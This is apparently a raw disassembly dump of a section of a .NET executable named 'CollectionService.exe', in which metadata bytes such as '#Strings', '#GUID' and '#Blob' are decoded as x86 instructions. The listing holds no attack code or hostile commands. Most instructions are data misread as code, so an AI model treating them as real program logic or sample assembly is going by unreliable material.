  4026b2:	add    BYTE PTR [eax],al
  4026b4:	pop    eax
  4026b5:	or     eax,DWORD PTR [eax]
  4026b7:	add    BYTE PTR [ebx],ah
  4026b9:	push   ebx
  4026ba:	je     0x40272e
  4026bc:	imul   ebp,DWORD PTR [esi+0x67],0x73
  4026c3:	add    BYTE PTR [eax],bh
  4026c5:	adc    al,BYTE PTR [eax]
  4026c7:	add    al,ch
  4026c9:	pop    es
  4026ca:	add    BYTE PTR [eax],al
  4026cc:	and    edx,DWORD PTR [ebp+0x53]
  4026cf:	add    BYTE PTR [eax],ah
  4026d1:	sbb    al,BYTE PTR [eax]
  4026d3:	add    BYTE PTR [eax],dl
  4026d5:	add    BYTE PTR [eax],al
  4026d7:	add    BYTE PTR [ebx],ah
  4026d9:	inc    edi
  4026da:	push   ebp
  4026db:	dec    ecx
  4026dc:	inc    esp
  4026dd:	add    BYTE PTR [eax],al
  4026df:	add    BYTE PTR [eax],dh
  4026e1:	sbb    al,BYTE PTR [eax]
  4026e3:	add    BYTE PTR [eax+ecx*1+0x0],al
  4026e7:	add    BYTE PTR [ebx],ah
  4026e9:	inc    edx
  4026ea:	ins    BYTE PTR es:[edi],dx
  4026eb:	outs   dx,DWORD PTR ds:[esi]
  4026ec:	bound  eax,QWORD PTR [eax]
  4026ee:	add    BYTE PTR [eax],al
  4026f0:	add    BYTE PTR [eax],al
  4026f2:	add    BYTE PTR [eax],al
  4026f4:	add    al,BYTE PTR [eax]
  4026f6:	add    BYTE PTR [ecx],al
  4026f8:	push   edi
  4026f9:	pop    ss
  4026fa:	mov    ds:0x909,al
  4026ff:	add    BYTE PTR [eax],al
  402701:	cli    
  402702:	and    eax,0x160033
  402707:	add    BYTE PTR [ecx],al
  402709:	add    BYTE PTR [eax],al
  40270b:	add    BYTE PTR [eax+0x0],cl
  40270e:	add    BYTE PTR [eax],al
  402710:	add    eax,DWORD PTR [eax]
  402712:	add    BYTE PTR [eax],al
  402714:	add    eax,0x10000000
  402719:	add    BYTE PTR [eax],al
  40271b:	add    BYTE PTR [ebx],cl
  40271d:	add    BYTE PTR [eax],al
  40271f:	add    BYTE PTR [ecx],al
  402721:	add    BYTE PTR [eax],al
  402723:	add    BYTE PTR [ebx+0x0],dl
  402726:	add    BYTE PTR [eax],al
  402728:	adc    al,0x0
  40272a:	add    BYTE PTR [eax],al
  40272c:	push   es
  40272d:	add    BYTE PTR [eax],al
  40272f:	add    BYTE PTR [ecx],al
  402731:	add    BYTE PTR [eax],al
  402733:	add    BYTE PTR [ecx],al
  402735:	add    BYTE PTR [eax],al
  402737:	add    BYTE PTR [ecx],al
  402739:	add    BYTE PTR [eax],al
  40273b:	add    BYTE PTR [edx],al
  40273d:	add    BYTE PTR [eax],al
  40273f:	add    BYTE PTR [ecx],al
  402741:	add    BYTE PTR [eax],al
  402743:	add    BYTE PTR [eax+eax*1],al
  402746:	add    BYTE PTR [eax],al
  402748:	add    BYTE PTR [eax],al
  40274a:	or     al,BYTE PTR [eax]
  40274c:	add    DWORD PTR [eax],eax
  40274e:	add    BYTE PTR [eax],al
  402750:	add    BYTE PTR [eax],al
  402752:	push   es
  402753:	add    BYTE PTR [eax+eax*1+0xa0085],cl
  40275a:	fiadd  DWORD PTR [eax]
  40275c:	mov    bl,0x0
  40275e:	push   es
  40275f:	add    ch,bh
  402761:	add    BYTE PTR [ebp+0x20000e00],al
  402767:	add    DWORD PTR ds:0x50000601,ecx
  40276d:	add    DWORD PTR [esi],esi
  40276f:	add    DWORD PTR [esi],ecx
  402771:	add    BYTE PTR [esi+0x1],dh
  402774:	test   DWORD PTR [eax],eax
  402776:	push   es
  402777:	add    cl,al
  402779:	add    DWORD PTR [edx-0x12fff9ff],ebp
  40277f:	add    DWORD PTR [edx+0x5000a01],ebp
  402785:	add    dh,BYTE PTR [ebx+0x40000a00]
  40278b:	add    dh,BYTE PTR [ebx+0x56000a00]
  402791:	add    dh,BYTE PTR [ebx+0x65000a00]
  402797:	add    dh,BYTE PTR [ebx-0x7bfff600]
  40279d:	add    dh,BYTE PTR [ebx-0x5cfffa00]
  4027a3:	add    ecx,DWORD PTR [ecx-0x24fff9fd]
  4027a9:	add    edi,DWORD PTR [ebx+eax*1+0x3ef0006]
  4027b0:	test   DWORD PTR [eax],eax
  4027b2:	push   es
  4027b3:	add    BYTE PTR [edi],dl
  4027b5:	add    al,0x5
  4027b7:	add    al,0x6
  4027b9:	add    BYTE PTR [esi],ch
  4027bb:	add    al,0x5
  4027bd:	add    al,0x6
  4027bf:	add    BYTE PTR [ebx+0x4],cl
  4027c2:	add    eax,0x69000604
  4027c7:	add    al,0x5
  4027c9:	add    al,0x6
  4027cb:	add    BYTE PTR [edx+0x6040504],al
  4027d1:	add    BYTE PTR [ebx+0x6040504],bl
  4027d7:	add    BYTE PTR [esi+0x6040504],dh
  4027dd:	add    bh,cl
  4027df:	add    al,0x5
  4027e1:	add    al,0x6
  4027e3:	add    ah,ch
  4027e5:	add    al,0x5
  4027e7:	add    al,0x6
  4027e9:	add    BYTE PTR [ebx],ah
  4027eb:	add    eax,0x60512
  4027f0:	inc    ebp
  4027f1:	add    eax,0x60512
  4027f6:	addr16 add eax,0x60405
  4027fc:	add    BYTE PTR ds:0x60405,0x9b
  402803:	add    eax,0x60405
  402808:	fld    DWORD PTR ds:0x605b9
  40280e:	test   DWORD PTR ds:0x83010d,0x60b
  402818:	push   es
  402819:	add    BYTE PTR [edx],bl
  40281b:	push   es
  40281c:	mov    ecx,0x4e000605
  402821:	push   es
  402822:	test   DWORD PTR [eax],eax
  402824:	adc    al,BYTE PTR [eax]
  402826:	jae    0x40282e
  402828:	pop    edi
  402829:	push   es
  40282a:	adc    al,BYTE PTR [eax]
  40282c:	jg     0x402834
  40282e:	pop    edi
  40282f:	push   es
  402830:	push   es
  402831:	add    BYTE PTR [ebx+0x12008506],dl
  402837:	add    dl,al
  402839:	push   es
  40283a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40283b:	push   es
  40283c:	push   es
  40283d:	add    ch,bl
  40283f:	push   es
  402840:	test   DWORD PTR [eax],eax
  402842:	push   es
  402843:	add    dl,ah
  402845:	push   es
  402846:	test   DWORD PTR [eax],eax
  402848:	adc    al,BYTE PTR [eax]
  40284a:	es pop es
  40284c:	push   es
  40284d:	pop    es
  40284e:	adc    al,BYTE PTR [eax]
  402850:	dec    ecx
  402851:	pop    es
  402852:	pop    edi
  402853:	push   es
  402854:	adc    al,BYTE PTR [eax]
  402856:	pop    ecx
  402857:	pop    es
  402858:	push   es
  402859:	pop    es
  40285a:	or     al,BYTE PTR [eax]
  40285c:	mov    BYTE PTR [edi],al
  40285e:	mov    bl,0x0
  402860:	adc    al,BYTE PTR [eax]
  402862:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402863:	pop    es
  402864:	pop    edi
  402865:	push   es
  402866:	adc    al,BYTE PTR [eax]
  402868:	loope  0x402871
  40286a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40286b:	push   es
  40286c:	or     al,BYTE PTR [eax]
  40286e:	cli    
  40286f:	pop    es
  402870:	mov    bl,0x0
  402872:	push   es
  402873:	add    BYTE PTR [edi],bl
  402875:	or     BYTE PTR [edx+0x43000601],ch
  40287b:	or     BYTE PTR [ebp+0x61000600],al
  402881:	or     BYTE PTR [ebp+0x75000a00],al
  402887:	or     BYTE PTR [ebx+0x7d000600],dh
  40288d:	or     BYTE PTR [ebp-0x53fffa00],al
  402893:	or     BYTE PTR [ebx-0x31ffedf8],bl
  402899:	or     BYTE PTR [edi+0x6],bl
  40289c:	push   es
  40289d:	add    BYTE PTR [eax],al
  40289f:	or     ebx,ebp
  4028a1:	or     BYTE PTR [esi],al
  4028a3:	add    BYTE PTR [edx],ch
  4028a5:	or     DWORD PTR [ebp+0x31000600],eax
  4028ab:	or     DWORD PTR [ebp+0x50000600],eax
  4028b1:	or     DWORD PTR [ebp+0x6b000600],eax
  4028b7:	or     ebx,ebp
  4028b9:	or     BYTE PTR [edx],cl
  4028bb:	add    BYTE PTR [edi+0xa00b309],dl
  4028c1:	add    BYTE PTR [ebp+0x1200b309],ch
  4028c7:	add    bl,dh
  4028c9:	or     DWORD PTR [edi+0x6],ebx
  4028cc:	push   es
  4028cd:	add    BYTE PTR [edx+ecx*1],cl
  4028d0:	stos   BYTE PTR es:[edi],al
  4028d1:	add    DWORD PTR [edx],ecx
  4028d3:	add    BYTE PTR [edi+0xa],al
  4028d6:	sbb    al,0xa
  4028d8:	or     al,BYTE PTR [eax]
  4028da:	js     0x4028e6
  4028dc:	mov    bl,0x0
  4028de:	or     al,BYTE PTR [eax]
  4028e0:	mov    BYTE PTR [edx],cl
  4028e2:	mov    bl,0x0
  4028e4:	or     al,BYTE PTR [eax]
  4028e6:	sahf   
  4028e7:	or     dh,BYTE PTR [ebx-0x18ffee00]
  4028ed:	or     bl,BYTE PTR [edi+0x6]
  4028f0:	or     al,BYTE PTR [eax]
  4028f2:	push   es
  4028f3:	or     ebx,DWORD PTR [edx+ecx*1]
  4028f6:	or     al,BYTE PTR [eax]
  4028f8:	sbb    ecx,DWORD PTR [ebx]
  4028fa:	mov    bl,0x0
  4028fc:	push   cs
  4028fd:	add    BYTE PTR [esi],ah
  4028ff:	or     ecx,DWORD PTR ds:0x1
  402905:	add    BYTE PTR [ecx],al
  402907:	add    BYTE PTR [eax],al
  402909:	add    BYTE PTR [eax],al
  40290b:	add    BYTE PTR [ecx],al
  40290d:	add    BYTE PTR [ecx],al
  40290f:	add    BYTE PTR [ecx],al
  402911:	add    BYTE PTR [eax],dl
  402913:	add    BYTE PTR [edx],ah
  402915:	add    BYTE PTR [edi],dh
  402917:	add    BYTE PTR ds:0x1000100,al
  40291d:	add    BYTE PTR [ecx],al
  40291f:	add    BYTE PTR [eax],dl
  402921:	add    BYTE PTR [edx+0x0],ch
  402924:	aaa    
  402925:	add    BYTE PTR ds:0x6000500,al
  40292b:	add    BYTE PTR [ecx],dl
  40292d:	add    ch,ch
  40292f:	add    BYTE PTR [ebx],dl
  402931:	add    BYTE PTR [ecx],dl
  402933:	add    BYTE PTR [edx],al
  402935:	add    DWORD PTR [esi],edx
  402937:	add    BYTE PTR [ecx],dl
  402939:	add    BYTE PTR [eax],ch
  40293b:	add    DWORD PTR [edx],ebx
  40293d:	add    BYTE PTR [ecx],dl
  40293f:	add    BYTE PTR [ebx+0x1],ah
  402942:	push   ds
  402943:	add    BYTE PTR [ecx],al
  402945:	add    al,bl
  402947:	add    DWORD PTR [edi],esi
  402949:	add    BYTE PTR [eax+0x21],dl
  40294c:	add    BYTE PTR [eax],al
  40294e:	add    BYTE PTR [eax],al
  402950:	xchg   esi,eax
  402951:	add    BYTE PTR [ecx+0x1],dh
  402954:	and    al,BYTE PTR [eax]
  402956:	add    DWORD PTR [eax],eax
  402958:	lods   al,BYTE PTR ds:[esi]
  402959:	and    al,BYTE PTR [eax]
  40295b:	add    BYTE PTR [eax],al
  40295d:	add    BYTE PTR [ecx+0x28017a00],dl
  402963:	add    BYTE PTR [edx],al
  402965:	add    BYTE PTR [eax],cl
  402967:	and    eax,DWORD PTR [eax]
  402969:	add    BYTE PTR [eax],al
  40296b:	add    BYTE PTR [ecx+0x2d018800],dl
  402971:	add    BYTE PTR [edx],al
  402973:	add    ah,ah
  402975:	and    eax,DWORD PTR [eax]
  402977:	add    BYTE PTR [eax],al
  402979:	add    BYTE PTR [esi+0x3301a418],al
  40297f:	add    BYTE PTR [ebx],al
  402981:	add    ah,bl
  402983:	and    eax,DWORD PTR [eax]
  402985:	add    BYTE PTR [eax],al
  402987:	add    BYTE PTR [ecx+0x2709ec18],dl
  40298d:	add    al,BYTE PTR [ebx]
  40298f:	add    ah,ch
  402991:	and    eax,DWORD PTR [eax]
  402993:	add    BYTE PTR [eax],al
  402995:	add    BYTE PTR [esi+0x3301a418],al
  40299b:	add    BYTE PTR [ebx],al
  40299d:	add    bh,bh
  40299f:	and    eax,DWORD PTR [eax]
  4029a1:	add    BYTE PTR [eax],al
  4029a3:	add    BYTE PTR [esi+0x3e01f208],al
  4029a9:	add    BYTE PTR [ebx],al
  4029ab:	add    BYTE PTR [esp],cl
  4029ae:	add    BYTE PTR [eax],al
  4029b0:	add    BYTE PTR [eax],al
  4029b2:	out    0x1,al
  4029b4:	push   ss
  4029b5:	add    al,BYTE PTR [ebx+0x0]
  4029b8:	add    eax,DWORD PTR [eax]
  4029ba:	adc    esp,DWORD PTR [eax+eax*1]
  4029bd:	add    BYTE PTR [eax],al
  4029bf:	add    dh,ah
  4029c1:	add    DWORD PTR [edx],ebp
  4029c3:	add    dh,BYTE PTR [ebx]
  4029c5:	add    BYTE PTR [ebx],al
  4029c7:	add    BYTE PTR [eax],dh
  4029c9:	and    al,0x0
  4029cb:	add    BYTE PTR [eax],al
  4029cd:	add    dh,ah
  4029cf:	add    DWORD PTR [edi+0x2],esi
  4029d2:	dec    eax
  4029d3:	add    BYTE PTR [ebx],al
  4029d5:	add    BYTE PTR [eax],ah
  4029d7:	and    eax,0x0
  4029dc:	out    0x1,al
  4029de:	cdq    
  4029df:	add    dl,BYTE PTR [ebp+0x0]
  4029e2:	or     BYTE PTR [eax],al
  4029e4:	add    al,0x26
  4029e6:	add    BYTE PTR [eax],al
  4029e8:	add    BYTE PTR [eax],al
  4029ea:	out    0x1,al
  4029ec:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4029ed:	add    bl,BYTE PTR [edx+0x0]
  4029f0:	or     BYTE PTR [eax],al
  4029f2:	adc    BYTE PTR [esi],ah
  4029f4:	add    BYTE PTR [eax],al
  4029f6:	add    BYTE PTR [eax],al
  4029f8:	out    0x1,al
  4029fa:	mov    dh,0x2
  4029fc:	pop    edx
  4029fd:	add    BYTE PTR [eax],cl
  4029ff:	add    BYTE PTR [edx],ah
  402a01:	add    BYTE PTR es:[eax],al
  402a04:	add    BYTE PTR [eax],al
  402a06:	out    0x1,al
  402a08:	int    0x2
  402a0a:	pop    esi
  402a0b:	add    BYTE PTR [eax],cl
  402a0d:	add    BYTE PTR [esi+eiz*1],ch
  402a10:	add    BYTE PTR [eax],al
  402a12:	add    BYTE PTR [eax],al
  402a14:	out    0x1,al
  402a16:	fld    QWORD PTR [edx]
  402a18:	add    BYTE PTR gs:[ebx],cl
  402a1b:	add    BYTE PTR [eax+0x26],al
  402a21:	add    dh,ah
  402a23:	add    esp,esi
  402a25:	add    bl,BYTE PTR [edx+0x0]
  402a28:	or     al,0x0
  402a2a:	add    BYTE PTR [eax],al
  402a2c:	add    DWORD PTR [eax],eax
  402a2e:	or     BYTE PTR [ebx],al
  402a30:	add    BYTE PTR [eax],al
  402a32:	add    DWORD PTR [eax],eax
  402a34:	or     BYTE PTR [ebx],al
  402a36:	add    BYTE PTR [eax],al
  402a38:	add    DWORD PTR [eax],eax
  402a3a:	or     eax,0x2000003
  402a3f:	add    BYTE PTR [edi],dl
  402a41:	add    eax,DWORD PTR [eax]
  402a43:	add    BYTE PTR [ebx],al
  402a45:	add    BYTE PTR [edx],ah
  402a47:	add    eax,DWORD PTR [eax]
  402a49:	add    BYTE PTR [eax+eax*1],al
  402a4c:	add    eax,DWORD PTR ss:[eax]
  402a4f:	add    BYTE PTR ds:0x34b00,al
  402a55:	add    BYTE PTR [ecx],al
  402a57:	add    BYTE PTR [esi+0x3],bl
  402a5a:	add    BYTE PTR [eax],al
  402a5c:	add    al,BYTE PTR [eax]
  402a5e:	jb     0x402a63
  402a60:	add    BYTE PTR [eax],al
  402a62:	add    eax,DWORD PTR [eax]
  402a64:	jp     0x402a69
  402a66:	add    BYTE PTR [eax],al
  402a68:	add    DWORD PTR [eax],eax
  402a6a:	test   DWORD PTR [ebx],eax
  402a6c:	add    eax,DWORD PTR [eax]
  402a6e:	or     DWORD PTR [eax],eax
  402a70:	jno    0x402a72
  402a72:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402a73:	add    DWORD PTR [edi+0x0],ebp
  402a76:	jns    0x402a78
  402a78:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402a79:	add    DWORD PTR [eax+eax*1-0x7f],esi
  402a7d:	add    BYTE PTR [ecx+eax*1+0x890074],ah
  402a84:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402a85:	add    DWORD PTR [edi+0x0],ebp
  402a88:	xchg   ecx,eax
  402a89:	add    BYTE PTR [ecx+eax*1+0x99006f],ah
  402a90:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402a91:	add    DWORD PTR [edi+0x0],ebp
  402a94:	mov    eax,ds:0x6f01a400
  402a99:	add    BYTE PTR [ecx+0x6f01a400],ch
  402a9f:	add    BYTE PTR [ecx+0x6f01a400],dh
  402aa5:	add    BYTE PTR [ecx+0x6f01a400],bh
  402aab:	add    cl,al
  402aad:	add    BYTE PTR [ecx+eax*1+0xc9006f],ah
  402ab4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402ab5:	add    DWORD PTR [edi+0x0],ebp
  402ab8:	rol    DWORD PTR [eax],1
  402aba:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402abb:	add    DWORD PTR [edi+0x0],ebp
  402abe:	fld    DWORD PTR [eax]
  402ac0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402ac1:	add    DWORD PTR [edi+0x0],ebp
  402ac4:	loope  0x402ac6
  402ac6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402ac7:	add    DWORD PTR [eax+eax*1-0x17],esi
  402acb:	add    BYTE PTR [ecx+eax*1+0xf1006f],ah
  402ad2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402ad3:	add    DWORD PTR [ecx+0x0],edi
  402ad6:	stc    
  402ad7:	add    BYTE PTR [ecx+eax*1+0x1010033],ah
  402ade:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402adf:	add    DWORD PTR [edi+0x0],edi
  402ae2:	adc    DWORD PTR [ecx],eax
  402ae4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402ae5:	add    DWORD PTR [esi+0x5a011900],eax
  402aeb:	push   es
  402aec:	sub    eax,0xa4012101
  402af1:	add    DWORD PTR [edx],esi
  402af3:	add    DWORD PTR [ecx],ebp
  402af5:	add    DWORD PTR [ecx+eax*1+0x1310033],esp
  402afc:	pushf  
  402afd:	push   es
  402afe:	cmp    al,BYTE PTR [ecx]
  402b00:	cmp    DWORD PTR [ecx],eax
  402b02:	retf   0x3f06
  402b05:	add    DWORD PTR [ecx+0x1],eax
  402b08:	hlt    
  402b09:	push   es
  402b0a:	inc    esi
  402b0b:	add    DWORD PTR [ecx],esp
  402b0d:	add    DWORD PTR [esi],esi
  402b0f:	pop    es
  402b10:	dec    edi
  402b11:	add    DWORD PTR [ecx+0x1],ebx
  402b14:	jbe    0x402b1d
  402b16:	pop    esp
  402b17:	add    DWORD PTR [ecx+0x1],ebp
  402b1a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402b1b:	add    DWORD PTR [edx+0x1],esp
  402b1e:	popa   
  402b1f:	add    ecx,eax
  402b21:	pop    es
  402b22:	push   0xf5017901
  402b27:	pop    es
  402b28:	xor    eax,DWORD PTR [eax]
  402b2a:	add    DWORD PTR [ecx],0x16f0809
  402b30:	inc    ecx
  402b31:	add    BYTE PTR [edx],bl
  402b33:	or     BYTE PTR [ebx],dh
  402b35:	add    BYTE PTR [ecx+0x0],al
  402b38:	sub    ecx,DWORD PTR [eax]
  402b3a:	jne    0x402b3d
  402b3c:	and    DWORD PTR [eax],eax
  402b3e:	aaa    
  402b3f:	or     BYTE PTR [ebx],dh
  402b41:	add    BYTE PTR [ecx+0x7b01a401],dl
  402b47:	add    DWORD PTR [ecx-0x7ef7b5ff],ecx
  402b4d:	add    DWORD PTR [ecx+0x0],eax
  402b50:	push   ebx
  402b51:	or     BYTE PTR [ecx+0x5b017901],cl
  402b57:	or     BYTE PTR [ebx],dh
  402b59:	add    BYTE PTR [ecx+0x33086d01],bl
  402b5f:	add    BYTE PTR [ecx-0x6ff778ff],ah
  402b65:	add    DWORD PTR [ecx-0x68f778ff],esp
  402b6b:	add    ecx,eax
  402b6d:	add    DWORD PTR [ecx+ecx*1],ecx
  402b70:	mov    ebp,0x21001901
  402b75:	or     ebx,eax
  402b77:	add    ecx,ecx
  402b79:	add    DWORD PTR [ecx+0x9],eax
  402b7c:	enter  0xa101,0x1
  402b80:	dec    eax
  402b81:	or     edx,edx
  402b83:	add    DWORD PTR [ecx],esi
  402b85:	add    BYTE PTR [ecx+eax*1+0x29006f],ah
  402b8c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402b8d:	add    DWORD PTR [edi+0x0],ebp
  402b90:	fld    DWORD PTR [ecx]
  402b92:	push   esi
  402b93:	or     edx,esp
  402b95:	add    DWORD PTR [ecx],esp
  402b97:	add    BYTE PTR [ecx+ecx*1-0x19],bl
  402b9b:	add    DWORD PTR [ecx],ebx
  402b9d:	add    BYTE PTR [esi+0x9],dl
  402ba0:	in     eax,dx
  402ba1:	add    ecx,eax
  402ba3:	add    DWORD PTR [ecx+ecx*1-0xd],edi
  402ba7:	add    ecx,ebx
  402ba9:	add    DWORD PTR [esi+0x9],edx
  402bac:	stc    
  402bad:	add    DWORD PTR [ecx+0x1098d01],esp
  402bb3:	add    al,cl
  402bb5:	add    DWORD PTR [ecx+eax*1+0x1e90086],esp
  402bbc:	mov    eax,ds:0xf1020809
  402bc1:	add    DWORD PTR [esi+0x19001609],edi
  402bc7:	add    ch,bl
  402bc9:	or     DWORD PTR [edi],ecx
  402bcb:	add    ah,BYTE PTR [ecx+0x1509e401]
  402bd1:	add    cl,BYTE PTR [ecx]
  402bd3:	add    BYTE PTR [ecx+eax*1+0x1f90033],ah
  402bda:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402bdb:	add    DWORD PTR [ebx],esi
  402bdd:	add    BYTE PTR [eax+eax*1],cl
  402be0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402be1:	add    DWORD PTR [ebx],esi
  402be3:	add    BYTE PTR [eax+eax*1],cl
  402be6:	adc    ecx,DWORD PTR [edx]
  402be8:	repz add cl,BYTE PTR [ecx]
  402beb:	add    dl,BYTE PTR [esi]
  402bed:	add    bh,ch
  402bef:	add    cl,BYTE PTR [eax+eax*1]
  402bf2:	push   esp
  402bf3:	or     al,BYTE PTR [edx]
  402bf5:	add    esp,DWORD PTR [ecx+0x80a6101]
  402bfb:	add    esp,DWORD PTR [ecx+0x8094801]
  402c01:	add    ecx,DWORD PTR [ecx]
  402c03:	add    ch,BYTE PTR [ebx+0xa]
  402c06:	push   cs
  402c07:	add    ecx,DWORD PTR [ecx]
  402c09:	add    dh,BYTE PTR [edi+0x2]
  402c0c:	dec    eax
  402c0d:	add    BYTE PTR [ecx],dl
  402c0f:	add    ah,BYTE PTR [ecx+eax*1+0x2190033]
  402c16:	scas   al,BYTE PTR es:[edi]
  402c17:	or     dl,BYTE PTR [ebx+eax*1]
  402c1a:	adc    DWORD PTR [edx],eax
  402c1c:	mov    esp,0xa9031a0a
  402c21:	add    edx,ecx
  402c23:	or     ah,BYTE PTR [ecx]
  402c25:	add    edx,DWORD PTR [ecx]
  402c27:	add    dl,dh
  402c29:	or     ch,BYTE PTR [edi+0x0]
  402c2c:	adc    al,0x0
  402c2e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402c2f:	add    DWORD PTR [esi],ebp
  402c31:	add    esp,DWORD PTR [ecx+0x350af801]
  402c37:	add    ecx,DWORD PTR [ecx]
  402c39:	add    bl,BYTE PTR [ecx+0x9005502]
  402c3f:	add    ah,BYTE PTR [ebp+0x31005a02]
  402c45:	add    dh,BYTE PTR [esi+0x39036f02]
  402c4b:	add    cl,ch
  402c4d:	add    dh,BYTE PTR [ebx+0x3]
  402c50:	and    DWORD PTR [eax],eax
  402c52:	xor    al,0xb
  402c54:	jp     0x402c59
  402c56:	inc    ecx
  402c57:	add    al,BYTE PTR [ebx+0xb]
  402c5a:	and    DWORD PTR [ebx],eax
  402c5c:	leave  
  402c5d:	add    DWORD PTR [eax+0xb],edx
  402c60:	add    BYTE PTR [ebx],0x2e
  402c63:	add    BYTE PTR [ebx+0x0],cl
  402c66:	cmp    BYTE PTR [esi+ebp*1],al
  402c69:	add    BYTE PTR [ebx],cl
  402c6b:	add    BYTE PTR [ebp+0x13002e03],cl
  402c71:	add    ah,dl
  402c73:	add    ebp,DWORD PTR [esi]
  402c75:	add    BYTE PTR [ebx],bl
  402c77:	add    ah,dl
  402c79:	add    ebp,DWORD PTR [esi]
  402c7b:	add    BYTE PTR [ebx],ah
  402c7d:	add    dl,bl
  402c7f:	add    ebp,DWORD PTR [esi]
  402c81:	add    BYTE PTR [ebx],ch
  402c83:	add    dl,bl
  402c85:	add    ebp,DWORD PTR [esi]
  402c87:	add    BYTE PTR [ebx],dh
  402c89:	add    dl,bl
  402c8b:	add    ebp,DWORD PTR [esi]
  402c8d:	add    BYTE PTR [ebx],bh
  402c8f:	add    bh,dh
  402c91:	add    ebp,DWORD PTR [esi]
  402c93:	add    BYTE PTR [ebx+0x0],al
  402c96:	adc    al,BYTE PTR [esi+ebp*1]
  402c99:	add    BYTE PTR [ebx+0x0],bh
  402c9c:	xchg   edi,eax
  402c9d:	add    al,0x2e
  402c9f:	add    BYTE PTR [ebx+0x2e083a00],ah
  402ca5:	add    BYTE PTR [ebx+0x0],ah
  402ca8:	ins    BYTE PTR es:[edi],dx
  402ca9:	add    al,0x2e
  402cab:	add    BYTE PTR [ebx+0x0],ch
  402cae:	jle    0x402cb4
  402cb0:	add    BYTE PTR cs:[ebx+0x0],dh
  402cb4:	mov    WORD PTR [esi+ebp*1],es
  402cb7:	add    BYTE PTR [ebx+0x0],bl
  402cba:	ins    BYTE PTR es:[edi],dx
  402cbb:	add    al,0x2e
  402cbd:	add    BYTE PTR [ebx+0x2e049d00],al
  402cc3:	add    BYTE PTR [ebx+0x2e04c800],cl
  402cc9:	add    BYTE PTR [ebx+0x2e081200],dl
  402ccf:	add    BYTE PTR [ebx+0x63083100],bl
  402cd5:	add    bl,ch
  402cd7:	add    DWORD PTR [ebx],ebp
  402cd9:	add    bl,BYTE PTR [edi+0x1a01da01]
  402cdf:	add    bh,BYTE PTR [edi]
  402ce1:	add    ebx,DWORD PTR [eax+0x3]
  402ce4:	xchg   BYTE PTR [ebx],al
  402ce6:	add    eax,DWORD PTR [eax]
  402ce8:	add    DWORD PTR [eax],eax
  402cea:	add    BYTE PTR [eax],al
  402cec:	stc    
  402ced:	add    ch,BYTE PTR [edx+0x0]
  402cf0:	add    al,BYTE PTR [eax]
  402cf2:	pop    es
  402cf3:	add    BYTE PTR [ebx],al
  402cf5:	add    ch,ch
  402cf7:	add    ah,BYTE PTR ds:0x800403
  402cfd:	add    BYTE PTR [ebx],cl
  402cff:	add    BYTE PTR [eax],al
  402d01:	add    BYTE PTR [eax],al
  402d03:	add    BYTE PTR [eax],al
  402d05:	add    BYTE PTR [ecx],al
  402d07:	add    BYTE PTR [eax],al
  402d09:	add    BYTE PTR [ebx+0x63a00],cl
  402d0f:	add    BYTE PTR [eax+eax*1],al
	...
  402d1a:	add    BYTE PTR [eax],al
  402d1c:	add    DWORD PTR [eax],eax
  402d1e:	jl     0x402d20
  402d20:	add    BYTE PTR [eax],al
  402d22:	add    BYTE PTR [eax],al
  402d24:	or     eax,DWORD PTR [eax]
	...
  402d2e:	add    BYTE PTR [eax],al
  402d30:	or     al,BYTE PTR [eax]
  402d32:	xchg   ebx,eax
  402d33:	add    BYTE PTR [eax],al
  402d35:	add    BYTE PTR [eax],al
  402d37:	add    BYTE PTR [eax+eax*1],al
	...
  402d42:	add    BYTE PTR [eax],al
  402d44:	add    DWORD PTR [eax],eax
  402d46:	test   DWORD PTR [eax],eax
  402d48:	add    BYTE PTR [eax],al
  402d4a:	add    BYTE PTR [eax],al
  402d4c:	add    al,0x0
	...
  402d56:	add    BYTE PTR [eax],al
  402d58:	add    DWORD PTR [eax],eax
  402d5a:	pop    edi
  402d5b:	push   es
	...
  402d64:	add    BYTE PTR [ecx*2+0x6c75646f],bh
  402d6b:	gs add BYTE PTR ds:[ebx+0x56],al
  402d70:	inc    ebx
  402d71:	outs   dx,DWORD PTR ds:[esi]
  402d72:	ins    BYTE PTR es:[edi],dx
  402d73:	ins    BYTE PTR es:[edi],dx
  402d74:	arpl   WORD PTR gs:[ecx+ebp*2+0x6f],si
  402d79:	outs   dx,BYTE PTR ds:[esi]
  402d7a:	push   ebx
  402d7b:	gs jb  0x402df4
  402d7e:	imul   esp,DWORD PTR [ebx+0x65],0x6578652e
  402d85:	add    BYTE PTR [ebx+0x6f],al
  402d88:	ins    BYTE PTR es:[edi],dx
  402d89:	ins    BYTE PTR es:[edi],dx
  402d8a:	arpl   WORD PTR gs:[ecx+ebp*2+0x6f],si
  402d8f:	outs   dx,BYTE PTR ds:[esi]
  402d90:	push   ebx
  402d91:	gs jb  0x402e0a
  402d94:	imul   esp,DWORD PTR [ebx+0x65],0x707041
  402d9b:	dec    ebp
  402d9c:	imul   esp,DWORD PTR [ebx+0x72],0x666f736f
  402da3:	je     0x402dd3
  402da5:	inc    ebx
  402da6:	outs   dx,DWORD PTR ds:[esi]
  402da7:	outs   dx,BYTE PTR ds:[esi]
  402da8:	arpl   WORD PTR [ebp+0x72],si
  402dab:	jb     0x402e12
  402dad:	outs   dx,BYTE PTR ds:[esi]
  402dae:	arpl   WORD PTR [ecx+0x56],di
  402db1:	imul   esi,DWORD PTR [ebx+0x75],0x7a696c61
